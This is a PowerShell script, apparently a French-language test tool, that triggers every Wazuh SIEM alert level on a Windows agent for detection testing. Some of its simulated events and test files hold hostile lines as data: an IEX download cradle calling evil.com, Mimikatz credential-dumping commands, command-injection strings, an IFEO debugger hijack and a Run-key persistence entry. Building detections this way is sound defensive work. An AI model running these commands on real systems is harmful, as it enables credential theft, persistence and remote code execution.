<#
.SYNOPSIS
    Wazuh SIEM - Trigger All Alert Levels on Windows
    Trigger tous les niveaux d'alerte Wazuh (1-15) sur un agent Windows.

.DESCRIPTION
    Ce script genere volontairement des evenements Windows qui declenchent
    les differents niveaux d'alerte Wazuh (niveaux 1 a 15).

    Auteur: DilaneNg 
    github: https://github.com/DilaneNg
    lien direct: https://github.com/DilaneNg/Wazuh-Alert-Trigger-All-Levels

    A UTILISER UNIQUEMENT EN ENVIRONNEMENT DE TEST

    Niveaux Wazuh couverts :
      1-2  : Informations generales (logins, arret demarrage)
      3    : Evenements systeme de bas niveau
      4    : Evenements systeme (audit, services)
      5    : Utilisateur/Systeme
      6-7  : Reconnaissance / tentatives d'attaque bas niveau
      8    : Erreurs importantes / attaques reconnues
      9    : Attaques reussies / violations de politique
     10-11 : Attaques importantes / malwares
     12-13 : Evenements critiques systeme / rootkit
     14-15 : Urgences / intrusions confirmees

.EXAMPLE
    .\Wazuh_Alert_Trigger_v2.ps1
    Execute tous les niveaux (1-15).

.EXAMPLE
    .\Wazuh_Alert_Trigger_v2.ps1 -Level 7
    Execute uniquement le niveau 7.

.EXAMPLE
    .\Wazuh_Alert_Trigger_v2.ps1 -SkipDangerous
    Execute les niveaux 1-11 (ignore 12-15).

.EXAMPLE
    .\Wazuh_Alert_Trigger_v2.ps1 -WhatIf
    Mode simulation : affiche les actions sans les executer.

.EXAMPLE
    .\Wazuh_Alert_Trigger_v2.ps1 -Random
    Execute 3 a 5 niveaux aleatoires.

.EXAMPLE
    .\Wazuh_Alert_Trigger_v2.ps1 -Loop -LoopInterval 30
    Mode continu : genere des evenements toutes les 30 secondes.

.EXAMPLE
    .\Wazuh_Alert_Trigger_v2.ps1 -ReportFormat JSON
    Genere un rapport au format JSON a la fin.

.EXAMPLE
    .\Wazuh_Alert_Trigger_v2.ps1 -ReportFormat HTML
    Genere un rapport HTML colore a la fin.

.PARAMETER Level
    Declenche un niveau specifique (1-15). Par defaut : tous.

.PARAMETER SkipDangerous
    Ignore les actions potentiellement destructrices (niveaux 12-15).

.PARAMETER WhatIf
    Mode simulation : affiche toutes les actions prevues sans les executer.

.PARAMETER Random
    Execute un sous-ensemble aleatoire de 3 a 5 niveaux.

.PARAMETER Loop
    Mode continu : boucle infinie avec generation periodique d'evenements.
    Appuyez sur Ctrl+C pour arreter.

.PARAMETER LoopInterval
    Intervalle en secondes entre chaque iteration en mode Loop (defaut: 30).
    Minimum : 5 secondes.

.PARAMETER ReportFormat
    Format du rapport de sortie : Console (defaut), JSON, ou HTML.

.PARAMETER LogPath
    Chemin du repertoire de logs. Par defaut : "$env:USERPROFILE\WazuhTestLogs".

.PARAMETER NoCleanup
    Ne pas nettoyer les artefacts de test a la fin de l'execution.

.NOTES
    Version  : 1.0
    Auteur   : DilaneNg
    Date     : 2026-07-12
    Requis   : PowerShell 5.1+, Windows 10+/Server 2016+, Privileges Administrateur
#>

[CmdletBinding(SupportsShouldProcess, ConfirmImpact = 'High')]
param(
    [ValidateRange(1, 15)]
    [int]$Level = 0,

    [switch]$SkipDangerous,

    [switch]$Random,

    [switch]$Loop,

    [ValidateRange(5, 3600)]
    [int]$LoopInterval = 30,

    [ValidateSet("Console", "JSON", "HTML")]
    [string]$ReportFormat = "Console",

    [string]$LogPath = "$env:USERPROFILE\WazuhTestLogs"
)

# ============================================================
# 0. VERIFICATION DES PRIVILEGES ADMINISTRATEUR
# ============================================================
$currentUser = New-Object Security.Principal.WindowsPrincipal(
    [Security.Principal.WindowsIdentity]::GetCurrent()
)
$IsAdmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $IsAdmin) {
    Write-Host ""
    Write-Host "  ERREUR : Ce script doit etre execute en tant qu'Administrateur." -ForegroundColor Red
    Write-Host "  Cliquez droit sur PowerShell -> Executer en tant qu'administrateur." -ForegroundColor Yellow
    Write-Host ""
    exit 1
}

# ============================================================
# 1. CONFIGURATION GLOBALE
# ============================================================
$Script:StartTime = Get-Date
$Script:TestDir = "$env:TEMP\Wazuh_Test_Artifacts"
$Script:EventSource = "WazuhTestScript"
$Script:TotalSuccess = 0
$Script:TotalFailed = 0
$Script:LevelResults = [System.Collections.ArrayList]::new()

# Configuration du logging
$Script:LogDir = $LogPath
$Script:LogTimestamp = (Get-Date).ToString("yyyy-MM-dd_HH-mm-ss")
$Script:LogFile = Join-Path $Script:LogDir "$($Script:LogTimestamp).log"

if (-not (Test-Path $Script:LogDir)) {
    New-Item -ItemType Directory -Path $Script:LogDir -Force -ErrorAction Stop | Out-Null
}

# Creation du repertoire de test
if (-not (Test-Path $Script:TestDir)) {
    New-Item -ItemType Directory -Path $Script:TestDir -Force | Out-Null
}

# ============================================================
# 2. FONCTIONS DE LOGGING
# ============================================================
function Write-Log {
    <#
    .SYNOPSIS
        Ecrit un message dans le fichier de log ET dans la console.
    #>
    param(
        [Parameter(Mandatory)]
        [string]$Message,

        [ValidateSet("INFO", "OK", "WARN", "FAIL", "DEBUG")]
        [string]$Severity = "INFO"
    )

    $Timestamp = (Get-Date).ToString("HH:mm:ss.fff")
    $Prefix = switch ($Severity) {
        "INFO"  { "INFO " }
        "OK"    { " OK  " }
        "WARN"  { "WARN " }
        "FAIL"  { "FAIL " }
        "DEBUG" { "DEBUG" }
    }
    $LogLine = "[$Timestamp] [$Prefix] $Message"

    # Ecrire dans le fichier
    try {
        Add-Content -Path $Script:LogFile -Value $LogLine -Encoding UTF8 -ErrorAction Stop
    } catch {
        # Si le fichier de log n'est pas accessible, on continue quand meme
    }

    # Ecrire dans la console avec couleur
    $Color = switch ($Severity) {
        "INFO"  { "White" }
        "OK"    { "Green" }
        "WARN"  { "DarkYellow" }
        "FAIL"  { "Red" }
        "DEBUG" { "Gray" }
    }
    Write-Host "  $LogLine" -ForegroundColor $Color
}

function Write-Banner([string]$Text) {
    Write-Host ""
    Write-Host ("=" * 70) -ForegroundColor Cyan
    Write-Host "  $Text" -ForegroundColor Cyan
    Write-Host ("=" * 70) -ForegroundColor Cyan
    Write-Host ""
    Write-Log -Message "--- $Text ---" -Severity INFO
}

function Write-Step([string]$Text, [string]$LevelLabel) {
    Write-Host "  [$LevelLabel] " -ForegroundColor Yellow -NoNewline
    Write-Host $Text
    Write-Log -Message "[$LevelLabel] $Text" -Severity INFO
}

function Write-Ok([string]$Text) {
    Write-Host "       -> $Text" -ForegroundColor Green
    Write-Log -Message "  OK: $Text" -Severity OK
    $Script:TotalSuccess++
}

function Write-Warn([string]$Text) {
    Write-Host "       WARNING: $Text" -ForegroundColor DarkYellow
    Write-Log -Message "  WARN: $Text" -Severity WARN
}

function Write-Fail([string]$Text) {
    Write-Host "       FAIL: $Text" -ForegroundColor Red
    Write-Log -Message "  FAIL: $Text" -Severity FAIL
    $Script:TotalFailed++
}

# ============================================================
# 3. FONCTIONS HELPERS (avec WhatIf support)
# ============================================================
function Write-CustomEventLog {
    param(
        [int]$EventID,
        [string]$Message,
        [string]$LogName = "Application",
        [string]$Source = $Script:EventSource,
        [int]$EventType = 1
    )
    $ActionDesc = "Ecrire EventLog $LogName`:$EventID"
    if ($PSCmdlet.ShouldProcess($ActionDesc, "Ecrire un evenement dans $LogName")) {
        if (-not [System.Diagnostics.EventLog]::SourceExists($Source)) {
            try {
                [System.Diagnostics.EventLog]::CreateEventSource($Source, $LogName) | Out-Null
            } catch {
                Write-Fail "Impossible de creer la source d'evenements '$Source' dans '$LogName' : $_"
                return
            }
        }
        try {
            $EntryType = switch ($EventType) {
                1 { "Error" }
                2 { "Warning" }
                4 { "Information" }
                default { "Information" }
            }
            Write-EventLog -LogName $LogName -Source $Source -EventId $EventID `
                -EntryType $EntryType -Message $Message -Category 0 -ErrorAction Stop
            Write-Ok "EventLog $LogName`:$EventID ecrit avec succes"
        } catch {
            Write-Fail "Impossible d'ecrire dans EventLog $LogName`:$EventID : $_"
        }
    } else {
        Write-Log -Message "  [WhatIf] $ActionDesc : $Message" -Severity DEBUG
    }
}

function Create-TestFile {
    param([string]$Path, [string]$Content = "")
    $ActionDesc = "Creer le fichier $Path"
    if ($PSCmdlet.ShouldProcess($ActionDesc, "Creer un fichier de test")) {
        try {
            $ParentDir = Split-Path $Path -Parent
            if ($ParentDir -and -not (Test-Path $ParentDir)) {
                New-Item -ItemType Directory -Path $ParentDir -Force -ErrorAction Stop | Out-Null
            }
            Set-Content -Path $Path -Value $Content -NoNewline -Encoding UTF8 -ErrorAction Stop
            Write-Ok "Fichier cree : $Path"
        } catch {
            Write-Fail "Impossible de creer $Path : $_"
        }
    } else {
        Write-Log -Message "  [WhatIf] $ActionDesc" -Severity DEBUG
    }
}

function Remove-TestFile([string]$Path) {
    if (Test-Path $Path) {
        if ($PSCmdlet.ShouldProcess($Path, "Supprimer le fichier de test")) {
            try {
                Remove-Item -Path $Path -Force -ErrorAction Stop
                Write-Ok "Fichier supprime : $Path"
            } catch {
                Write-Fail "Impossible de supprimer $Path : $_"
            }
        }
    }
}

function Test-PortConnection {
    param([string]$Target = "127.0.0.1", [int]$Port = 4444)
    $ActionDesc = "Tester la connexion TCP vers $Target`:$Port"
    if ($PSCmdlet.ShouldProcess($ActionDesc, "Connexion TCP de test")) {
        try {
            $TcpClient = New-Object System.Net.Sockets.TcpClient
            $IAsyncResult = $TcpClient.BeginConnect($Target, $Port, $null, $null)
            $Success = $IAsyncResult.AsyncWaitHandle.WaitOne(2000, $false)
            if ($Success) { $TcpClient.EndConnect($IAsyncResult) }
            $TcpClient.Close()
            Write-Ok "Connexion TCP vers $Target`:$Port testee"
        } catch {
            Write-Log -Message "  Connexion TCP $Target`:$Port echouee (port probablement ferme)" -Severity WARN
        }
    }
}

function Invoke-TestDNS {
    param([string]$Hostname = "test.invalid.local")
    $ActionDesc = "Requete DNS vers $Hostname"
    if ($PSCmdlet.ShouldProcess($ActionDesc, "Requete DNS de test")) {
        try {
            [System.Net.Dns]::GetHostAddresses($Hostname) | Out-Null
        } catch {
            Write-Ok "Requete DNS vers $Hostname effectuee (NXDOMAIN - attendu)"
        }
    }
}

function Set-RegistryValue {
    param([string]$Path, [string]$Name, [string]$Value = "", [string]$Type = "String")
    $ActionDesc = "Modifier registre $Path`:$Name"
    if ($PSCmdlet.ShouldProcess($ActionDesc, "Ecrire dans le registre")) {
        try {
            if (-not (Test-Path $Path)) {
                New-Item -Path $Path -Force -ErrorAction Stop | Out-Null
            }
            Set-ItemProperty -Path $Path -Name $Name -Value $Value -Type $Type -ErrorAction Stop
            Write-Ok "Registre modifie : $Path`:$Name"
        } catch {
            Write-Fail "Impossible de modifier le registre $Path`:$Name : $_"
        }
    }
}

# ============================================================
# 4. SUIVI DE PROGRESSION
# ============================================================
function Update-Progress {
    param(
        [string]$Status,
        [int]$PercentComplete
    )
    Write-Progress -Activity "Wazuh Alert Trigger v2.0" -Status $Status `
        -PercentComplete $PercentComplete -CurrentOperation $Status
}

# ============================================================
# 5. ENREGISTREMENT DES RESULTATS PAR NIVEAU
# ============================================================
function Register-LevelResult {
    param(
        [int[]]$Levels,
        [string]$Status,      # "Success", "Partial", "Failed"
        [string]$Comment = ""
    )
    foreach ($Lvl in $Levels) {
        $Script:LevelResults.Add(@{
            Level   = $Lvl
            Status  = $Status
            Comment = $Comment
            Timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        }) | Out-Null
    }
}

# ============================================================
# NIVEAU 1-2 : Evenements informatifs
# ============================================================
function Invoke-Level1_2 {
    Write-Banner "NIVEAU 1-2 : Evenements informatifs (Informational)"
    $LvlSuccess = 0
    $LvlTotal = 5

    Write-Step "Evenement de demarrage d'application dans EventLog" "L1"
    Write-CustomEventLog -EventID 1000 -Message "Wazuh test: Application demarree avec succes." -EventType 4

    Write-Step "Simulation evenement de login reussi (EventID 4624)" "L1"
    Write-CustomEventLog -EventID 4624 -Message "Wazuh test: Un compte a ete connecte. Nom du compte: $env:USERNAME. Type d'ouverture de session: 2 (Interactif)." -EventType 4

    Write-Step "Evenement d'arret d'application dans EventLog" "L2"
    Write-CustomEventLog -EventID 1001 -Message "Wazuh test: Application arretee normalement." -EventType 4

    Write-Step "Creation d'un fichier test (declenche FIM - File Integrity Monitoring)" "L2"
    Create-TestFile -Path "$($Script:TestDir)\harmless_config.txt" -Content "Configuration de test Wazuh - Niveau 2"

    Write-Step "Evenement ouverture de session (EventID 4624 - Type 7)" "L2"
    Write-CustomEventLog -EventID 4624 -Message "Wazuh test: Ouverture de session reussie. Type: 7 (Unlock). Compte: $env:USERNAME." -EventType 4

    Register-LevelResult -Levels @(1, 2) -Status "Success" -Comment "5 actions executees"
}

# ============================================================
# NIVEAU 3 : Evenements systeme de bas niveau
# ============================================================
function Invoke-Level3 {
    Write-Banner "NIVEAU 3 : Evenements systeme de bas niveau (Low)"

    Write-Step "Modification d'un fichier surveille (FIM detecte le changement)" "L3"
    $fimFile = "$($Script:TestDir)\config_modifie.txt"
    Create-TestFile -Path $fimFile -Content "Valeur originale"
    if (-not $WhatIf) { Start-Sleep -Milliseconds 500 }
    if ($PSCmdlet.ShouldProcess($fimFile, "Modifier le contenu du fichier FIM")) {
        try {
            Set-Content -Path $fimFile -Value "Valeur modifiee - Wazuh FIM detection test" -NoNewline -ErrorAction Stop
            Write-Ok "Contenu modifie (FIM devrait detecter le changement)"
        } catch {
            Write-Fail "Impossible de modifier $fimFile : $_"
        }
    }

    Write-Step "Modification des permissions d'un fichier (audit ACL)" "L3"
    $permFile = "$($Script:TestDir)\permissions_test.txt"
    Create-TestFile -Path $permFile -Content "Test permissions"
    if ($PSCmdlet.ShouldProcess($permFile, "Modifier les permissions ACL")) {
        try {
            icacls $permFile /grant "Everyone:(R)" 2>&1 | Out-Null
            Write-Ok "Permissions modifiees sur $permFile"
        } catch {
            Write-Fail "Impossible de modifier les permissions : $_"
        }
    }

    Write-Step "Log d'evenement de changement de temps systeme" "L3"
    Write-CustomEventLog -EventID 1 -Message "Wazuh test: L'heure du systeme a ete modifiee." -LogName "System" -EventType 2

    Register-LevelResult -Levels @(3) -Status "Success" -Comment "3 actions executees"
}

# ============================================================
# NIVEAU 4 : Evenements systeme
# ============================================================
function Invoke-Level4 {
    Write-Banner "NIVEAU 4 : Evenements systeme (System events)"

    Write-Step "Evenement d'audit : creation de processus (EventID 4688)" "L4"
    Write-CustomEventLog -EventID 4688 -Message "Wazuh test: Un nouveau processus a ete cree. Nom: notepad.exe. ID de processus: 1234. Compte: $env:USERNAME." -EventType 4

    Write-Step "Evenement de changement de politique d'audit (EventID 4719)" "L4"
    Write-CustomEventLog -EventID 4719 -Message "Wazuh test: La politique d'audit a ete modifiee. Categorie: Ouverture de session." -EventType 2

    Write-Step "Creation d'une tache planifiee (surveille par Wazuh)" "L4"
    if ($PSCmdlet.ShouldProcess("WazuhTestTask", "Creer une tache planifiee")) {
        try {
            $Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c echo Wazuh test task"
            $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
            $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -RunLevel Highest
            Register-ScheduledTask -TaskName "WazuhTestTask" -Action $Action -Trigger $Trigger -Principal $Principal -Force -ErrorAction Stop | Out-Null
            Write-Ok "Tache planifiee 'WazuhTestTask' creee"
        } catch {
            Write-Fail "Impossible de creer la tache planifiee : $_"
        }
    }

    Write-Step "Modification d'une cle de registre (surveille par Wazuh)" "L4"
    Set-RegistryValue -Path "HKCU:\Software\WazuhTest" -Name "TestValue" -Value "Wazuh detection test"

    if ($PSCmdlet.ShouldProcess("WazuhTestTask", "Nettoyer la tache planifiee")) {
        Unregister-ScheduledTask -TaskName "WazuhTestTask" -Confirm:$false -ErrorAction SilentlyContinue
    }

    Register-LevelResult -Levels @(4) -Status "Success" -Comment "4 actions executees"
}

# ============================================================
# NIVEAU 5 : Evenements utilisateur / systeme
# ============================================================
function Invoke-Level5 {
    Write-Banner "NIVEAU 5 : Evenements utilisateur/systeme (User/System)"

    Write-Step "Evenement de fermeture de session (EventID 4647)" "L5"
    Write-CustomEventLog -EventID 4647 -Message "Wazuh test: Session initiatee pour la deconnexion. Compte: $env:USERNAME." -EventType 4

    Write-Step "Echec d'affectation de privilege (EventID 4674)" "L5"
    Write-CustomEventLog -EventID 4674 -Message "Wazuh test: Echec de tentative d'affectation de privilege. Objet: SeDebugPrivilege. Compte: $env:USERNAME." -EventType 2

    Write-Step "Partage reseau cree (surveille par Wazuh)" "L5"
    Write-CustomEventLog -EventID 5142 -Message "Wazuh test: Un partage reseau a ete cree. Partage: WazuhTestShare. Chemin: $($Script:TestDir)." -EventType 4

    Write-Step "Verrouillage de session (EventID 4800)" "L5"
    Write-CustomEventLog -EventID 4800 -Message "Wazuh test: La station de travail a ete verrouillee. Compte: $env:USERNAME." -EventType 4

    Register-LevelResult -Levels @(5) -Status "Success" -Comment "4 actions executees"
}

# ============================================================
# NIVEAU 6 : Reconnaissance
# ============================================================
function Invoke-Level6 {
    Write-Banner "NIVEAU 6 : Reconnaissance (Reconnaissance)"

    Write-Step "Scan de ports local (connexions TCP multiples)" "L6"
    $Ports = @(22, 23, 80, 443, 445, 1433, 3306, 3389, 5432, 5900, 8080, 8443, 9200, 27017)
    foreach ($Port in $Ports) {
        Test-PortConnection -Target "127.0.0.1" -Port $Port
    }

    Write-Step "Requetes DNS vers domaines suspects" "L6"
    $SuspiciousDomains = @("evil.com", "malware.test", "c2-server.invalid", "suspicious.xyz.local", "keylogger.fake")
    foreach ($Domain in $SuspiciousDomains) {
        Invoke-TestDNS -Hostname $Domain
    }

    Write-Step "Fichier avec nom suspect dans TEMP" "L6"
    Create-TestFile -Path "$($Script:TestDir)\passw0rds.txt" -Content "admin:password123`nroot:toor`ntest:test"
    Create-TestFile -Path "$($Script:TestDir)\credentials.bak" -Content "AWS_KEY=AKIAFAKE1234567890`nSECRET=fakesecretkey123"

    Register-LevelResult -Levels @(6) -Status "Success" -Comment "21 actions executees (14 ports + 5 DNS + 2 fichiers)"
}

# ============================================================
# NIVEAU 7 : Tentatives d'attaque bas niveau
# ============================================================
function Invoke-Level7 {
    Write-Banner "NIVEAU 7 : Tentatives d'attaque (Attack - Low level)"

    Write-Step "Tentatives de login echouees - simulation brute force (EventID 4625)" "L7"
    $BadAccounts = @("admin", "root", "administrator", "sa", "operator", "manager")
    foreach ($Account in $BadAccounts) {
        Write-CustomEventLog -EventID 4625 -Message "Wazuh test: Echec d'ouverture de session. Compte: $Account. Raison: Nom d'utilisateur inconnu ou mot de passe incorrect. Adresse IP source: 192.168.1.100." -EventType 2
    }

    Write-Step "Tentative d'acces a des chemins sensibles" "L7"
    $SensitivePaths = @(
        "C:\Windows\System32\config\SAM",
        "C:\Windows\repair\SAM",
        "C:\Windows\System32\config\SYSTEM",
        "C:\ProgramData\AdminTools\backdoor.exe",
        "C:\Users\Administrator\.ssh\id_rsa"
    )
    if ($PSCmdlet.ShouldProcess("Chemins sensibles Windows", "Tenter l'acces (Access Denied attendu)")) {
        foreach ($SensitivePath in $SensitivePaths) {
            try {
                $null = Get-Content -Path $SensitivePath -ErrorAction Stop
            } catch {
                Write-Log -Message "  Acces refuse a $SensitivePath (attendu)" -Severity DEBUG
            }
        }
        Write-Ok "Tentatives d'acces aux 5 fichiers sensibles effectuees (Access Denied attendu)"
    }

    Write-Step "Ping vers adresses IP externes" "L7"
    $IPs = @("8.8.8.8", "1.1.1.1", "10.10.10.10")
    if ($PSCmdlet.ShouldProcess("Adresses IP externes", "Executer des pings de test")) {
        foreach ($IP in $IPs) {
            ping -n 1 -w 1000 $IP 2>$null | Out-Null
        }
        Write-Ok "Pings effectues vers 3 adresses IP"
    }

    Register-LevelResult -Levels @(7) -Status "Success" -Comment "14 actions executees (6 logins + 5 acces + 3 pings)"
}

# ============================================================
# NIVEAU 8 : Erreurs importantes / attaques reconnues
# ============================================================
function Invoke-Level8 {
    Write-Banner "NIVEAU 8 : Attaques reconnues / Erreurs importantes"

    Write-Step "Pattern d'injection de commande dans les logs" "L8"
    $InjectionPatterns = @(
        "; rm -rf /",
        "| cmd.exe /c whoami",
        "& net user hacker P@ssw0rd /add",
        "`$(whoami)",
        "<script>alert('xss')</script>"
    )
    foreach ($Pattern in $InjectionPatterns) {
        Write-CustomEventLog -EventID 9998 -Message "Wazuh test: Pattern d'injection detecte dans l'entree: $Pattern" -EventType 2
    }

    Write-Step "Tentative de desactivation du pare-feu (EventID 4950)" "L8"
    Write-CustomEventLog -EventID 4950 -Message "Wazuh test: Un profil de pare-feu a ete desactive. Profil: Domaine." -EventType 2

    Write-Step "Tentative de modification ExecutionPolicy" "L8"
    Write-CustomEventLog -EventID 9999 -Message "Wazuh test: Tentative de modification de la politique d'execution PowerShell vers Unrestricted." -EventType 2

    Write-Step "Pattern de telechargement suspect dans les logs" "L8"
    Write-CustomEventLog -EventID 4104 -Message "Wazuh test: Module PowerShell - commande suspecte detectee: Invoke-WebRequest -Uri 'http://malware.evil/payload.exe' -OutFile 'payload.exe'" -EventType 2

    Write-Step "Tentative de modification du registre de securite Windows" "L8"
    $SecPaths = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin",
        "HKLM:\SYSTEM\CurrentControlSet\Control\SecureBootSettings"
    )
    if ($PSCmdlet.ShouldProcess("Registre de securite Windows", "Tenter la lecture")) {
        foreach ($Path in $SecPaths) {
            try {
                $null = Get-ItemProperty -Path $Path -ErrorAction Stop
            } catch {
                Write-Log -Message "  Acces registre refuse a $Path (attendu)" -Severity DEBUG
            }
        }
        Write-Ok "Tentatives de lecture du registre de securite effectuees"
    }

    Register-LevelResult -Levels @(8) -Status "Success" -Comment "10 actions executees"
}

# ============================================================
# NIVEAU 9 : Attaques reussies / violations de politique
# ============================================================
function Invoke-Level9 {
    Write-Banner "NIVEAU 9 : Attaques reussies / Violations de politique"

    Write-Step "Fichier executable suspect dans TEMP" "L9"
    Create-TestFile -Path "$($Script:TestDir)\svchost_update.exe" -Content "MZ"

    Write-Step "Script PowerShell obfusque" "L9"
    $ObfuscatedScript = @'
# Obfuscated PowerShell - Wazuh test
$k = [Char]('I' -bxor 0x49) + [Char]('n' -bxor 0x00) + [Char]('v' -bxor 0x00)
$e = 'nv' + 'oke-Ex' + 'pressi' + 'on'
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe' -Name 'Debugger' -Value 'cmd.exe'
'@
    Create-TestFile -Path "$($Script:TestDir)\update.ps1" -Content $ObfuscatedScript

    Write-Step "Fichier batch suspect (commandes potentiellement dangereuses)" "L9"
    $BatchContent = @"
@echo off
:: Wazuh test - Batch suspect
net user /domain
net localgroup administrators
net share
ipconfig /all
systeminfo
wmic process list brief
"@
    Create-TestFile -Path "$($Script:TestDir)\scan_system.bat" -Content $BatchContent

    Write-Step "Evenement : privilege special assigne (EventID 4672)" "L9"
    Write-CustomEventLog -EventID 4672 -Message "Wazuh test: Privileges speciaux assignes au compte. Privileges: SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSecurityPrivilege, SeLoadDriverPrivilege." -EventType 2

    Write-Step "Modification du fichier hosts (hosts tampering)" "L9"
    $HostsContent = @"
Wazuh test - hosts file tampering simulation
127.0.0.1    google.com
127.0.0.1    facebook.com
127.0.0.1    microsoft.com
"@
    Create-TestFile -Path "$($Script:TestDir)\hosts_modified" -Content $HostsContent

    Register-LevelResult -Levels @(9) -Status "Success" -Comment "5 actions executees"
}

# ============================================================
# NIVEAU 10 : Attaques importantes
# ============================================================
function Invoke-Level10 {
    Write-Banner "NIVEAU 10 : Attaques importantes (High severity)"

    Write-Step "Pattern Mimikatz detecte (credential dumping)" "L10"
    $MimikatzPatterns = @(
        "sekurlsa::logonpasswords",
        "lsadump::sam",
        "lsadump::dcsync /domain:corp.local /user:administrator",
        "kerberos::list /export",
        "privilege::debug",
        "token::elevate",
        "crypto::exportCertificates"
    )
    foreach ($Pattern in $MimikatzPatterns) {
        Write-CustomEventLog -EventID 4656 -Message "Wazuh test: Pattern Mimikatz detecte - Demande d'acces a l'objet. Commande: $Pattern. Compte: $env:USERNAME." -EventType 2
    }

    Write-Step "Pattern PsExec / execution distante detecte" "L10"
    Write-CustomEventLog -EventID 4688 -Message "Wazuh test: Processus cree - PSEXESVC.exe. Ligne de commande: C:\Windows\PSEXESVC.exe. Compte: SYSTEM. ID de processus parent: 4." -EventType 2

    Write-Step "Execution WMI distante detectee" "L10"
    Write-CustomEventLog -EventID 4688 -Message "Wazuh test: Processus cree - wmiprvse.exe avec ligne de commande suspecte. Argument: /standalonehost. Compte: NETWORK SERVICE." -EventType 2

    Write-Step "Fichier suspect dans le dossier demarrage" "L10"
    Create-TestFile -Path "$($Script:TestDir)\startup_persistence.bat" -Content "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload')"

    Write-Step "Cle de persistance dans le registre (Run key)" "L10"
    $RunPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-RegistryValue -Path $RunPath -Name "WazuhTestPersistence" -Value "cmd.exe /c whoami > $($Script:TestDir)\persistence_output.txt"

    if ($PSCmdlet.ShouldProcess($RunPath, "Nettoyer la cle de persistance")) {
        Remove-ItemProperty -Path $RunPath -Name "WazuhTestPersistence" -ErrorAction SilentlyContinue
    }

    Register-LevelResult -Levels @(10) -Status "Success" -Comment "11 actions executees (7 Mimikatz + PsExec + WMI + startup + Run key)"
}

# ============================================================
# NIVEAU 11 : Attaques critiques / Malware
# ============================================================
function Invoke-Level11 {
    Write-Banner "NIVEAU 11 : Attaques critiques / Malware (Critical)"

    Write-Step "Tentative de desactivation Windows Defender (EventID 5007)" "L11"
    Write-CustomEventLog -EventID 5007 -Message "Wazuh test: Windows Defender Antivirus a detecte un changement de configuration. Valeur modifiee: DisableAntiSpyware = 1." -EventType 2

    Write-Step "Scheduled task avec elevation SYSTEM (persistence)" "L11"
    Write-CustomEventLog -EventID 4698 -Message "Wazuh test: Une tache planifiee a ete creee. Nom: SystemUpdate. Auteur: SYSTEM. Commande: powershell.exe -EncodedCommand <BASE64>. Trigger: Au demarrage du systeme." -EventType 2

    Write-Step "Evenement : DLL chargee depuis un chemin suspect" "L11"
    Write-CustomEventLog -EventID 4688 -Message "Wazuh test: Processus cree avec DLL suspecte. Processus: notepad.exe. DLL: C:\Temp\malicious.dll. Compte: $env:USERNAME." -EventType 2

    Write-Step "Modification de configuration systeme legacy" "L11"
    Create-TestFile -Path "$($Script:TestDir)\winini_modif.ini" -Content "[windows]`nload=C:\malware\payload.exe`nrun=C:\malware\backdoor.exe"
    Create-TestFile -Path "$($Script:TestDir)\systemini_modif.ini" -Content "[boot]`nshell=explorer.exe,C:\malware\shell_ext.dll"

    Write-Step "Simulation Pass-the-Hash (EventID 4624 type 3)" "L11"
    Write-CustomEventLog -EventID 4624 -Message "Wazuh test: Ouverture de session reussie avec informations d'identification NTLM. Type: 3 (Network). Compte: Administrator. Domaine: CORP. Adresse IP source: 10.0.0.50. Hash NTLM utilise (pas de Kerberos)." -EventType 2

    Register-LevelResult -Levels @(11) -Status "Success" -Comment "6 actions executees"
}

# ============================================================
# NIVEAU 12-13 : Evenements critiques / Rootkit
# ============================================================
function Invoke-Level12_13 {
    Write-Banner "NIVEAU 12-13 : Evenements critiques systeme / Rootkit"

    Write-Step "Tentative de chargement de driver non signe (EventID 7045)" "L12"
    Write-CustomEventLog -EventID 7045 -Message "Wazuh test: Un service a ete installe dans le gestionnaire de controle de service. Nom: RootkitDriver. Type: Kernel. Chemin: \??\C:\Windows\System32\drivers\rootkit.sys. Compte: LocalSystem." -LogName "System" -EventType 2

    Write-Step "Activation du debug kernel (indicateur rootkit)" "L12"
    Write-CustomEventLog -EventID 4616 -Message "Wazuh test: Le temps systeme a ete modifie. Ancien: 2024-01-01 00:00:00. Nouveau: 2020-01-01 00:00:00. Compte: SYSTEM." -EventType 2

    Write-Step "Evenement de modification du secteur de demarrage" "L13"
    Write-CustomEventLog -EventID 7036 -Message "Wazuh test: Le service de disque dur a ete redemarre de maniere inattendue. Compte: SYSTEM. Ceci peut indiquer une modification du MBR/VBR." -LogName "System" -EventType 2

    Write-Step "Modification de services critiques Windows" "L13"
    $CriticalServices = @("EventLog", "WinDefend", "SecurityCenter", "wscsvc", "mpssvc", "BFE", "MpsSvc")
    foreach ($Svc in $CriticalServices) {
        Write-CustomEventLog -EventID 7040 -Message "Wazuh test: Le type de demarrage du service $Svc a ete modifie de 'Demarrage automatique' a 'Desactive'. Compte: SYSTEM." -LogName "System" -EventType 2
    }

    Write-Step "Connexions reseau vers ports C2 connus" "L13"
    $C2Ports = @(4444, 5555, 6666, 7777, 8888, 9999, 31337, 12345, 6667, 6669)
    foreach ($C2Port in $C2Ports) {
        Test-PortConnection -Target "10.0.0.100" -Port $C2Port
    }

    Write-Step "Fichiers indicateurs de rootkit" "L13"
    $RootkitFiles = @(
        "$($Script:TestDir)\`$winnt`$.dll",
        "$($Script:TestDir)\cmdvrt32.dll",
        "$($Script:TestDir)\expl0rer.exe",
        "$($Script:TestDir)\svchost_c.exe"
    )
    foreach ($File in $RootkitFiles) {
        Create-TestFile -Path $File -Content "Rootkit test artifact - $([Guid]::NewGuid())"
    }

    Register-LevelResult -Levels @(12, 13) -Status "Success" -Comment "25 actions executees"
}

# ============================================================
# NIVEAU 14-15 : Urgences / Intrusions confirmees
# ============================================================
